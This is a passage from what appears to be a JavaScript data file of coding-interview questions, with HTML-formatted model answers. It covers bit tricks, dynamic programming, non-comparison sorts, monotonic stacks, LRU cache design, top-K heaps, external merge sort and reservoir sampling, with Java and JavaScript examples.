<pre>// Check if number is even or odd:
(n & 1) == 0  →  even   (last bit is 0)
(n & 1) == 1  →  odd    (last bit is 1)

// Multiply/divide by 2:
n << 1  →  n * 2
n >> 1  →  n / 2

// Check if power of 2:
(n & (n - 1)) == 0  →  is power of 2
// 8 = 1000, 7 = 0111 → 1000 & 0111 = 0000 ✅

// Swap without temp variable:
a ^= b; b ^= a; a ^= b;

// Find the only non-duplicate in array:
// [2, 3, 2, 4, 3] → XOR all: 2^3^2^4^3 = 4
// (because x ^ x = 0, and x ^ 0 = x)</pre>
<pre>// Java: Count number of 1 bits
int hammingWeight(int n) {
    int count = 0;
    while (n != 0) {
        count += (n & 1);
        n >>>= 1;  // unsigned right shift
    }
    return count;
}</pre>
<div class="key-point">XOR is the most useful bit operator in interviews. Key properties: <code>x ^ x = 0</code>, <code>x ^ 0 = x</code>. This solves "find the single number" in O(n) time, O(1) space.</div>`,
      },
      {
        q: 'What is Memoization vs Tabulation in Dynamic Programming?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>They're the two ways to implement DP and they compute the same thing. Memoization is top-down: write the natural recursion and cache results, so it only ever computes the states you actually reach — great when the state space is sparse, and easier to write since you don't work out a fill order. Tabulation is bottom-up: fill a table iteratively in dependency order, which avoids recursion overhead and stack-overflow risk and usually makes space optimization obvious (keep only the last row). My rule: prototype with memoization because it maps straight to the recurrence, then convert to tabulation if I need the performance, the space trick, or recursion depth is a risk. The gotcha with memoization is a correct cache key covering the full state.</p></div>
<p>Both are strategies for DP. They store computed results to avoid redundant work.</p>
<p><strong>Memoization (Top-Down):</strong> Start from the big problem, recursively break it down, and <strong>cache</strong> results as you go.</p>
<p><strong>Tabulation (Bottom-Up):</strong> Start from the smallest sub-problems, iteratively build up to the answer using a <strong>table</strong>.</p>
<p><strong>Analogy — Building a staircase to floor 10:</strong></p>
<ul>
<li><strong>Memoization</strong>: Start at floor 10, ask "how do I get here?" → need floor 9 → need floor 8... Eventually reach floor 1 (base case). Remember each floor's answer.</li>
<li><strong>Tabulation</strong>: Start at floor 1, calculate ways to reach floor 2, then floor 3... build up to floor 10.</li>
</ul>
<pre>// Climbing Stairs: How many ways to reach step n? (1 or 2 steps at a time)

// Memoization (Top-Down):
int[] memo = new int[n + 1];
int climb(int n) {
    if (n <= 2) return n;
    if (memo[n] != 0) return memo[n];
    memo[n] = climb(n - 1) + climb(n - 2);  // recurse + cache
    return memo[n];
}

// Tabulation (Bottom-Up):
int climb(int n) {
    int[] dp = new int[n + 1];
    dp[1] = 1; dp[2] = 2;
    for (int i = 3; i <= n; i++) {
        dp[i] = dp[i-1] + dp[i-2];  // build from small to big
    }
    return dp[n];
}</pre>
<table><tr><th>Feature</th><th>Memoization</th><th>Tabulation</th></tr>
<tr><td>Direction</td><td>Top → Down</td><td>Bottom → Up</td></tr>
<tr><td>Technique</td><td>Recursion + cache</td><td>Iteration + table</td></tr>
<tr><td>Computes</td><td>Only needed subproblems</td><td>All subproblems</td></tr>
<tr><td>Stack overflow?</td><td>Possible (deep recursion)</td><td>No</td></tr></table>
<div class="key-point">Memoization is usually <strong>easier to write</strong> (just add cache to recursion). Tabulation is <strong>more efficient</strong> (no recursion overhead) and avoids stack overflow. In interviews, start with memoization, then optimize to tabulation if asked.</div>`,
      },
      {
        q: 'How does Counting Sort / Radix Sort work? When are they faster than O(n log n)?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>These beat the O(n log n) comparison lower bound by not comparing elements — they exploit the structure of the keys instead. Counting sort tallies occurrences of each key and rebuilds the output in O(n + k), where k is the value range, so it's linear only when k is comparable to n; a huge range makes it useless and memory-hungry. Radix sort applies a stable counting sort digit by digit, giving O(d·(n + b)) for d digits in base b — good for fixed-width integers or strings. The catch to state clearly is that the O(n log n) bound only applies to comparison sorts; these trade generality and memory for speed and only work on integer-like keys with a bounded range. Counting sort's stability is what makes radix sort correct.</p></div>
<p><strong>Counting Sort</strong> and <strong>Radix Sort</strong> are non-comparison sorts that can beat the O(n log n) barrier by using the structure of the data itself.</p>
<p><strong>Counting Sort — O(n + k)</strong> where k is the range of values:</p>
<p><strong>Analogy:</strong> You have 100 exam scores from 0-100. Instead of comparing scores, just count how many students got each score and rebuild the sorted list.</p>
<pre>Input: [4, 2, 2, 8, 3, 3, 1]

Step 1: Count occurrences:
  index: 0  1  2  3  4  5  6  7  8
  count: 0  1  2  2  1  0  0  0  1

Step 2: Build sorted output by reading counts:
  1 appears 1 time → [1]
  2 appears 2 times → [1, 2, 2]
  3 appears 2 times → [1, 2, 2, 3, 3]
  4 appears 1 time → [1, 2, 2, 3, 3, 4]
  8 appears 1 time → [1, 2, 2, 3, 3, 4, 8] ✅</pre>
<p><strong>Radix Sort — O(d × (n + k))</strong> where d = number of digits:</p>
<pre>Sort [170, 45, 75, 90, 802, 24, 2, 66]:

Sort by 1s digit:  [170, 90, 802, 2, 24, 45, 75, 66]
Sort by 10s digit: [802, 2, 24, 45, 66, 170, 75, 90]
Sort by 100s digit:[2, 24, 45, 66, 75, 90, 170, 802] ✅</pre>
<table><tr><th>Algorithm</th><th>Time</th><th>Works when</th></tr>
<tr><td>Counting Sort</td><td>O(n + k)</td><td>Small range of integers (e.g., ages 0-150)</td></tr>
<tr><td>Radix Sort</td><td>O(d(n+k))</td><td>Fixed-length integers or strings</td></tr></table>
<div class="key-point">These sorts are <strong>faster than Quick/Merge Sort</strong> when the data range is limited. Counting Sort is used inside Radix Sort as a subroutine. Not suitable for arbitrary floating-point numbers.</div>`,
      },
      {
        q: 'What is a Monotonic Stack and when do you use it?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>A monotonic stack keeps its elements in sorted order by popping anything that would violate the order as you push — and that popping is where the work happens. It's the specialized tool for "next/previous greater or smaller element" problems: the moment you pop an element you've found its next greater element, which turns an O(n²) scan into O(n) because each element is pushed and popped at most once. The classic applications are next-greater-element, daily temperatures, largest rectangle in a histogram, and stock span. The tell in an interview is "for each element, find the nearest bigger or smaller one." The gotcha is deciding whether to store values or indices — usually indices, so you can compute distances — and getting the increasing-vs-decreasing direction right for the question.</p></div>
<p>A <strong>Monotonic Stack</strong> is a stack that maintains elements in a strictly increasing or decreasing order. Elements are popped when the ordering would be violated.</p>
<p><strong>Analogy:</strong> A line of people sorted by height. When a tall person arrives, everyone shorter in front of them steps out of line. The line stays in order.</p>
<p><strong>Classic problem: Next Greater Element</strong></p>
<pre>Input: [2, 1, 2, 4, 3]
Output: [4, 2, 4, -1, -1]   (next element that is GREATER)

For each number, what's the next bigger number to its right?
  2 → next greater is 4
  1 → next greater is 2
  2 → next greater is 4
  4 → nothing bigger → -1
  3 → nothing bigger → -1

Using Monotonic Stack (decreasing):
  i=0: stack=[], push 0 → stack=[0(2)]
  i=1: 1 < 2, push 1 → stack=[0(2), 1(1)]
  i=2: 2 > 1, pop 1 → answer[1]=2. 2 == 2, push 2 → stack=[0(2), 2(2)]
  i=3: 4 > 2, pop 2 → answer[2]=4. 4 > 2, pop 0 → answer[0]=4. push 3 → stack=[3(4)]
  i=4: 3 < 4, push 4 → stack=[3(4), 4(3)]
  Remaining: answer[3]=-1, answer[4]=-1</pre>
<pre>// Java: Next Greater Element
int[] nextGreater(int[] nums) {
    int[] result = new int[nums.length];
    Arrays.fill(result, -1);
    Deque&lt;Integer&gt; stack = new ArrayDeque&lt;&gt;(); // stores indices
    
    for (int i = 0; i < nums.length; i++) {
        while (!stack.isEmpty() && nums[stack.peek()] < nums[i]) {
            result[stack.pop()] = nums[i]; // found next greater!
        }
        stack.push(i);
    }
    return result;
}</pre>
<p><strong>Use cases:</strong> Next greater/smaller element, largest rectangle in histogram, stock span problem, trapping rain water.</p>
<div class="key-point">Monotonic stack solves "next greater/smaller element" problems in <strong>O(n)</strong> instead of O(n²). Each element is pushed and popped at most once.</div>`,
      },
      {
        q: 'What is Binary Search on Answer?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>This is the technique that unlocks a whole class of "minimize the maximum" or "maximize the minimum" problems that don't look like search at all. Instead of searching an array, you binary-search over the range of possible answers, and for each candidate you run a feasibility check — "can we do it with this value?" The precondition is monotonicity: if a candidate works, everything above (or below) it works too, which is what lets you discard half the range each step. Classic examples are splitting an array into k parts to minimize the largest sum, Koko eating bananas, and resource allocation. Complexity is O(log(range) × cost-of-check). The two things to nail are proving monotonicity and writing a correct predicate — the check is usually a simple greedy pass.</p></div>
<p><strong>Binary Search on Answer</strong> = instead of searching for an element in an array, you binary search over the <strong>range of possible answers</strong> to find the optimal one.</p>
<p><strong>Analogy:</strong> "What's the minimum speed to deliver all packages within 8 hours?" Speed could be 1-1000. Instead of trying each, binary search: "Is speed 500 enough? Yes → try 250. No → try 750."</p>
<p><strong>Example: Koko Eating Bananas</strong></p>
<pre>Problem: Koko has piles of bananas [3, 6, 7, 11]. 
Guard returns in 8 hours. Find minimum eating speed.

At speed k: time = ceil(3/k) + ceil(6/k) + ceil(7/k) + ceil(11/k)

Binary search on k (answer range: 1 to max(piles) = 11):
  mid=6: time = 1+1+2+2 = 6 ≤ 8 ✅ → try smaller → right=6
  mid=3: time = 1+2+3+4 = 10 > 8 ❌ → try bigger → left=4
  mid=5: time = 1+2+2+3 = 8 ≤ 8 ✅ → try smaller → right=5
  mid=4: time = 1+2+2+3 = 8 ≤ 8 ✅ → try smaller → right=4
  left=4, right=4 → Answer: 4 🍌/hour</pre>
<pre>// Java: Binary Search on Answer
int minEatingSpeed(int[] piles, int h) {
    int left = 1, right = Arrays.stream(piles).max().getAsInt();
    while (left < right) {
        int mid = (left + right) / 2;
        if (canFinish(piles, h, mid)) right = mid;
        else left = mid + 1;
    }
    return left;
}

boolean canFinish(int[] piles, int h, int speed) {
    int hours = 0;
    for (int pile : piles) hours += (pile + speed - 1) / speed;
    return hours <= h;
}</pre>
<p><strong>Pattern recognition:</strong> If the problem asks "find minimum/maximum X such that condition Y is satisfied" and the condition is <strong>monotonic</strong> (once true, stays true), use binary search on answer.</p>
<div class="key-point">This pattern appears in: splitting array, capacity to ship packages, magnetic force between balls, minimized maximum. Always ask: "Can I binary search the answer?"</div>`,
      },
      {
        q: 'What is the difference between a Set, Map, and List?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>These are the three workhorses and the choice is about what you need. A List is an ordered sequence allowing duplicates, indexed by position — use it when order matters or you need duplicates. A Set is an unordered collection of unique elements optimized for membership testing — use it for dedup and "have I seen this?" A Map is key-value associations with unique keys — use it for lookups by key. The nuance a senior adds is the implementation behind each interface: hash-based (HashSet, HashMap) for O(1) average but no order, tree-based (TreeSet, TreeMap) for O(log n) with sorted order, and linked variants for insertion-order iteration. So the real question is interface first — what operations — then implementation, meaning ordering and complexity tradeoffs.</p></div>
<p>Three fundamental collection types in programming:</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>List</strong> = Shopping list: ordered, can have duplicates ("buy milk, eggs, milk").</li>
<li><strong>Set</strong> = Guest list at a party: no duplicates allowed ("John" appears only once).</li>
<li><strong>Map</strong> = Phone book: each name (key) maps to a phone number (value).</li>
</ul>
<pre>List:  [1, 2, 3, 2, 1]  → ordered, duplicates OK
Set:   {1, 2, 3}         → no duplicates, no guaranteed order
Map:   {"a":1, "b":2}    → key-value pairs, keys are unique</pre>
<table><tr><th>Feature</th><th>List (ArrayList)</th><th>Set (HashSet)</th><th>Map (HashMap)</th></tr>
<tr><td>Duplicates</td><td>Yes</td><td>No</td><td>Keys: No, Values: Yes</td></tr>
<tr><td>Order</td><td>Maintained</td><td>Not guaranteed*</td><td>Not guaranteed*</td></tr>
<tr><td>Access</td><td>By index O(1)</td><td>By value O(1)</td><td>By key O(1)</td></tr>
<tr><td>Use case</td><td>Ordered collection</td><td>Unique elements</td><td>Key→Value lookup</td></tr></table>
<pre>// Java examples:
List&lt;String&gt; list = new ArrayList&lt;&gt;();
list.add("apple"); list.add("apple"); // [apple, apple] ✅

Set&lt;String&gt; set = new HashSet&lt;&gt;();
set.add("apple"); set.add("apple"); // {apple} (only one!)

Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();
map.put("apple", 5); map.get("apple"); // 5</pre>
<div class="key-point">*Use <code>LinkedHashSet</code>/<code>LinkedHashMap</code> for insertion order, <code>TreeSet</code>/<code>TreeMap</code> for sorted order. In interviews, choose the right collection: need uniqueness? Set. Need key-value? Map. Need ordering? List.</div>`,
      },
      {
        q: 'Design an LRU Cache with O(1) get and put.',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The whole challenge is getting O(1) for both get and put, and the insight is that no single structure does it — so you combine two: a hash map for O(1) key lookup and a doubly-linked list to track recency order. The map points to nodes in the list; on access you move the node to the front, and on eviction you drop the tail — all O(1) pointer surgery because you hold direct node references. The doubly-linked part is essential: you need O(1) removal from the middle, which a singly-linked list can't do. The gotchas are keeping both structures in sync and the edge cases — updating an existing key, capacity of one. In real life I'd just use a <code>LinkedHashMap</code> in access-order, or Caffeine/Guava, which do exactly this.</p></div>
<p>THE classic senior coding question. An LRU (Least Recently Used) cache evicts the item that hasn't been touched for the longest time. The trick: <strong>no single structure gives O(1) for everything</strong>, so you combine two:</p>
<ul>
<li><strong>HashMap</strong>: key → node. O(1) lookup — but no notion of "order of use".</li>
<li><strong>Doubly-linked list</strong>: nodes ordered by recency (head = most recent, tail = LRU victim). O(1) move-to-front and remove — but O(n) lookup.</li>
</ul>
<p>Why <em>doubly</em> linked? To remove a node in O(1) you need its <code>prev</code> pointer. Why not an array/ArrayList for order? Moving an element to the front is O(n). Each structure covers the other's weakness.</p>
<pre>class LRUCache {
  constructor(capacity) {
    this.cap = capacity;
    this.map = new Map();           // key -> node
    this.head = {}; this.tail = {}; // sentinel nodes: no null checks
    this.head.next = this.tail;
    this.tail.prev = this.head;
  }
  _remove(n)  { n.prev.next = n.next; n.next.prev = n.prev; }
  _addFront(n){ n.next = this.head.next; n.prev = this.head;
                this.head.next.prev = n; this.head.next = n; }

  get(key) {
    const n = this.map.get(key);
    if (!n) return -1;
    this._remove(n); this._addFront(n);  // touch = move to front
    return n.value;
  }
  put(key, value) {
    if (this.map.has(key)) this._remove(this.map.get(key));
    const n = { key, value };
    this._addFront(n); this.map.set(key, n);
    if (this.map.size > this.cap) {
      const lru = this.tail.prev;        // real LRU node
      this._remove(lru);
      this.map.delete(lru.key);          // node stores key for this!
    }
  }
}</pre>
<pre>// Walkthrough, capacity 2:
put(1,A) → [1]        put(2,B) → [2,1]
get(1)   → A, [1,2]   // 1 touched, now most recent
put(3,C) → evict tail = 2 → [3,1]
get(2)   → -1         // gone</pre>
<p><strong>Java one-liner (mention it, then still code the real thing):</strong></p>
<pre>new LinkedHashMap&lt;K,V&gt;(16, 0.75f, true) {  // true = accessOrder!
  protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; e) {
    return size() > capacity;
  }
};</pre>
<p><strong>Follow-ups to expect:</strong> classic pitfalls (forgetting to store the key in the node — you can't delete from the map on eviction without it; forgetting that <code>get</code> also reorders); thread safety (lock striping, or segment the cache like old ConcurrentHashMap); LFU as the harder sequel; TTL expiry on top.</p>
<div class="key-point">LRU = HashMap for O(1) lookup + doubly-linked list for O(1) recency updates; each structure exists to fix the other's O(n) weakness, and the node must carry its key so eviction can clean the map.</div>`,
      },
      {
        q: 'How do you find the Top-K elements from a huge stream of data?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The naive "sort and take K" is O(n log n) and needs all n in memory, which fails on a stream. The standard answer is a min-heap of size K: iterate once, push each element, and pop the smallest whenever the heap exceeds K, so the heap always holds the K largest seen. That's O(n log K) time and O(K) space, which is the win — it never holds the whole stream. The direction trips people up: for top-K largest you keep a min-heap so the weakest survivor is cheap to evict. For a one-shot in-memory array, Quickselect gives O(n) average by partitioning around the K-th element. And at true scale it's a distributed problem — partial top-K per shard then merge — which is Count-Min sketch territory for approximate heavy hitters.</p></div>
<p>The naive answer — sort everything, take the first K — is O(n log n) and requires holding all n items. The senior answer: keep a <strong>min-heap of size K</strong>.</p>
<pre>// Top-K largest with a MIN-heap (yes, MIN — the counterintuitive part):
// The heap root is the SMALLEST of the current top K —
// i.e. the "weakest member of the club" = the cheapest to test against.
function topK(stream, k) {
  const heap = new MinHeap();
  for (const x of stream) {
    if (heap.size() < k) heap.push(x);
    else if (x > heap.peek()) {   // beats the weakest member?
      heap.pop();                 // kick it out
      heap.push(x);               // O(log k)
    }                             // else: ignore in O(1)
  }
  return heap.toArray();          // the top K
}

// Trace: k=3, stream = 5, 1, 9, 3, 7, 6
// [5] → [1,5] → [1,5,9] → 3>1? yes → [3,5,9]
// → 7>3? yes → [5,7,9] → 6>5? yes → [6,7,9]  ✓ top 3</pre>
<table><tr><th>Approach</th><th>Time</th><th>Space</th><th>Streaming?</th></tr>
<tr><td>Full sort</td><td>O(n log n)</td><td>O(n)</td><td>No — needs all data</td></tr>
<tr><td>Min-heap of size K</td><td>O(n log k)</td><td><strong>O(k)</strong></td><td><strong>Yes</strong></td></tr>
<tr><td>Quickselect</td><td>O(n) average</td><td>O(n), in-place</td><td>No — needs random access</td></tr></table>
<p><strong>Why O(n log k) matters:</strong> for n = 1 billion and k = 100, log k ≈ 7 vs log n ≈ 30 — and O(k) memory means the billion items never need to fit in RAM. That's what makes it work on a <em>stream</em>.</p>
<p><strong>When quickselect wins:</strong> the data already sits in an in-memory array, you only need this once, and you don't need the K results sorted — quickselect partitions around the K-th element in O(n) average. Its downsides: O(n²) worst case (mitigate with random pivots), destroys input order, useless for streams.</p>
<p><strong>Follow-ups to expect:</strong> "top K <em>frequent</em> elements" (hash map of counts first, then heap over the entries); "top K across many machines" (each node computes local top K, merge the K·m candidates); "K comparable to n" (just sort).</p>
<div class="key-point">Min-heap of size K: the root is the weakest of the current winners, so each new item needs one O(1) comparison and at most an O(log k) replace — O(n log k) time, O(k) space, and it works when the data can't fit in memory.</div>`,
      },
      {
        q: 'How do you sort a 100 GB file with only 1 GB of RAM?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The point is that sorting doesn't stop working when data exceeds RAM — the answer is external merge sort. Phase one: read the file in chunks that fit in memory, sort each chunk in RAM, and write it back as a sorted "run" on disk. Phase two: k-way merge those runs using a min-heap holding one element from each run, streaming the merged output to disk — you only ever hold one buffer per run in memory. It's the same algorithm a database uses when an ORDER BY spills to disk, and what MapReduce shuffles and Unix <code>sort</code> do. The tuning knobs are chunk size versus available RAM and the merge fan-in — too many runs forces a multi-pass merge. The dominant cost is disk I/O, so you optimize for sequential reads and large buffers.</p></div>
<p>The systems-flavored sorting question — it checks whether you know that sorting doesn't stop working when data exceeds RAM. The answer is <strong>external merge sort</strong>, the same algorithm inside databases (ORDER BY spills), MapReduce shuffles, and Unix <code>sort</code>.</p>
<pre>// Phase 1: CHUNK → SORT → SPILL
// Read ~1 GB at a time, sort in memory, write sorted "run" to disk.
100 GB input
  → read chunk 1 (1 GB) → quicksort in RAM → write run_001 (sorted)
  → read chunk 2 (1 GB) → sort           → write run_002
  → ... → 100 sorted run files on disk

// Phase 2: K-WAY MERGE with a min-heap of size K (= 100)
// Open all runs; heap holds ONE current element per run.
heap = MinHeap of (value, runId)
push first element of each run                  // 100 entries
while heap not empty:
    (v, run) = heap.pop()        // global minimum across all runs
    output.write(v)              // buffered writes!
    if run has next: heap.push(next element of run)

// Memory in phase 2: 100 input buffers × ~10 MB + heap of 100
// entries + output buffer — comfortably under 1 GB.</pre>
<p><strong>Why a heap for the merge?</strong> Picking the minimum of K run-heads naively is O(K) per output element; the heap makes it O(log K). Total: O(n log K) merge after O(n log(chunk)) sorting — overall the classic O(n log n), just I/O-aware.</p>
<p><strong>What actually dominates: disk I/O, not CPU.</strong> Every element is read twice and written twice (once per phase) — so the design goal is minimizing <em>passes</em>:</p>
<ul>
<li>Use large sequential, buffered reads/writes per run — random 4 KB I/O would destroy throughput, especially on HDDs.</li>
<li>If runs outnumber what you can merge at once (too many open buffers), do <strong>multi-pass</strong> merging: merge 100 runs into 1 in groups, repeat. Passes = ceil(log_K(runs)).</li>
<li>Replacement selection (heap-based run generation) produces runs ~2× RAM size on average → fewer runs → fewer merge passes.</li>
</ul>
<p><strong>Follow-ups to expect:</strong> "what if it's 100 TB?" → shard across machines, external-sort locally, then distributed merge (this is essentially the MapReduce shuffle); "what if lines are variable-length records?" → same idea, count bytes not rows; "how does your database do ORDER BY without an index?" → exactly this, look for "external sort" in the query plan.</p>
<div class="key-point">External merge sort = sort RAM-sized chunks into sorted runs, then k-way merge them with a min-heap; the real engineering is minimizing disk passes with big sequential buffered I/O, because I/O — not comparisons — is the bottleneck.</div>`,
      },
      {
        q: 'Find the missing or duplicate number in an array of 1..n — compare the three classic solutions.',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>It's deceptively simple, and the interviewer wants to see how many approaches you have and their tradeoffs. The three classics: a hash set or boolean array — O(n) time, O(n) space, trivial and general; the sum formula — expected n(n+1)/2 minus the actual sum gives the missing number — O(n) time, O(1) space, elegant but risks integer overflow on large n; and XOR — XOR all values with 1..n so the pairs cancel and the answer remains — O(n) time, O(1) space, and no overflow, which makes it the cleanest. There's also cyclic sort or index-marking (negate the value at each seen index) if you may mutate the array. I'd lead with XOR or the sum trick and then name the overflow caveat, because naming the failure mode is the signal.</p></div>
<p>Deceptively simple, but interviewers use it to see how many tools you have — and whether you know each one's failure mode. Setup: array of numbers from 1..n with one missing (or one duplicated).</p>
<pre>// Solution 1: Sum formula — O(n) time, O(1) space
// Expected sum of 1..n = n(n+1)/2
function findMissing(nums, n) {
  let expected = n * (n + 1) / 2;
  let actual = nums.reduce((a, b) => a + b, 0);
  return expected - actual;
}
// FAILURE MODE: overflow. n = 10^9 → sum ≈ 5×10^17, past 2^53
// (and past int32/int64 in other languages much sooner).
// JS numbers silently lose precision → wrong answer, no error.</pre>
<pre>// Solution 2: XOR trick — O(n) time, O(1) space, NO overflow
// x ^ x = 0,  x ^ 0 = x,  XOR is commutative.
// XOR all indices 1..n AND all values: pairs cancel,
// only the missing number survives.
function findMissing(nums, n) {
  let x = 0;
  for (let i = 1; i <= n; i++) x ^= i;
  for (const v of nums) x ^= v;
  return x;
}
// Why no overflow: XOR never carries — the result always fits
// in the same bit-width as the inputs. This is the "why XOR"
// answer interviewers fish for.</pre>
<pre>// Solution 3: Floyd's cycle detection — for the DUPLICATE variant
// (n+1 numbers in range 1..n, exactly one repeated;
//  constraint: no modifying the array, O(1) space)
// Treat value nums[i] as a pointer to index nums[i]:
// a duplicate value = two arrows into the same node = a cycle.
// The duplicate is the cycle's ENTRY point.
function findDuplicate(nums) {
  let slow = nums[0], fast = nums[0];
  do { slow = nums[slow]; fast = nums[nums[fast]]; }
  while (slow !== fast);        // phase 1: meet inside cycle
  slow = nums[0];
  while (slow !== fast) {       // phase 2: entry = duplicate
    slow = nums[slow]; fast = nums[fast];
  }
  return slow;
}
// Same algorithm as linked-list cycle detection — recognizing
// the array-as-implicit-linked-list mapping is the senior move.</pre>
<table><tr><th>Approach</th><th>Time</th><th>Space</th><th>Gotcha</th></tr>
<tr><td>Sum formula</td><td>O(n)</td><td>O(1)</td><td>Overflow on large n</td></tr>
<tr><td>XOR</td><td>O(n)</td><td>O(1)</td><td>None — carry-free</td></tr>
<tr><td>Floyd's</td><td>O(n)</td><td>O(1)</td><td>Only for duplicate; needs values as valid indices</td></tr></table>
<p><strong>Follow-ups to expect:</strong> "TWO numbers missing?" (XOR gives a^b; split all numbers into two groups by any set bit of a^b, XOR each group separately); "duplicates AND missing together?" (XOR pairs or index-marking by negation if mutation is allowed).</p>
<div class="key-point">Sum formula is the obvious answer with a silent overflow bug; XOR is carry-free so it can't overflow; and Floyd's works because an array of values-in-range IS an implicit linked list — the duplicate is the cycle entrance.</div>`,
      },
      {
        q: 'What is Reservoir Sampling? How do you pick a random item from a stream of unknown length?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>Reservoir sampling picks a uniformly random item from a stream of unknown length in O(1) space — you can't count first, so the trick is probabilistic. For a single item: keep the current pick, and when the i-th item arrives replace your held item with probability 1/i. A quick induction shows every item ends up with probability exactly 1/n. For a sample of size k you keep a reservoir of k and replace with probability k/i. The beauty is one pass, O(1) or O(k) memory, and no knowledge of n — which is exactly why it's used for sampling logs, big-data streams, and picking a random line from a huge file. The gotcha is getting the replacement probability right; an off-by-one there silently biases toward early or late elements.</p></div>
<p>Problem: items arrive one at a time; you don't know how many will come and can't store them all. When the stream ends, you must hold ONE item chosen <strong>uniformly at random</strong> — every item with probability exactly 1/n — using O(1) space.</p>
<pre>// Reservoir sampling (k = 1):
function sample(stream) {
  let chosen = null, i = 0;
  for (const item of stream) {
    i++;
    if (Math.floor(Math.random() * i) === 0) {  // probability 1/i
      chosen = item;    // replace with prob 1/i
    }
  }
  return chosen;
}
// item 1: kept with prob 1/1 (always, it's all we have)
// item 2: replaces with prob 1/2
// item 3: replaces with prob 1/3 ... item i: prob 1/i</pre>
<p><strong>The proof (this IS the interview):</strong> why does "replace with probability 1/i" make every item end up with probability 1/n? Item j survives if it's chosen at step j AND never replaced afterwards:</p>
<pre>P(item j survives)
  = P(chosen at step j) × P(not replaced at j+1) × ... × P(not replaced at n)
  = (1/j) × (j/(j+1)) × ((j+1)/(j+2)) × ... × ((n-1)/n)
        ↑ telescoping: every numerator cancels the previous denominator
  = 1/n            — same for EVERY j. Uniform. ∎

// Sanity check, n = 3:
// item 1: 1 × 1/2 × 2/3 = 1/3
// item 2: 1/2 × 2/3     = 1/3
// item 3: 1/3           = 1/3   ✓</pre>
<p><strong>General k (Algorithm R):</strong> keep the first k items; for item i &gt; k, pick a random index r in [0, i); if r &lt; k, evict <code>reservoir[r]</code>. Each item ends with probability k/n, in O(k) space.</p>
<pre>function reservoirK(stream, k) {
  const res = []; let i = 0;
  for (const item of stream) {
    i++;
    if (res.length < k) res.push(item);
    else {
      const r = Math.floor(Math.random() * i);   // 0..i-1
      if (r < k) res[r] = item;                  // prob k/i
    }
  }
  return res;
}</pre>
<p><strong>Where it shows up in real systems:</strong> log/trace sampling ("keep 1000 random requests from today"), online ML training-set selection, picking a random row from a huge table scan — anywhere n is unknown or too big to hold.</p>
<p><strong>Follow-ups to expect:</strong> weighted reservoir sampling (Efraimidis–Spirakis: keep the k items with largest random^(1/weight) keys); distributed streams (sample per shard, then merge with counts); and the classic "prove it" — practice writing the telescoping product on a whiteboard.</p>
<div class="key-point">Replace the held item with probability 1/i and the survival probabilities telescope to exactly 1/n for every item — uniform sampling from an unknown-length stream in O(1) space; be ready to write that two-line proof.</div>`,
      },
    ],
  },
];
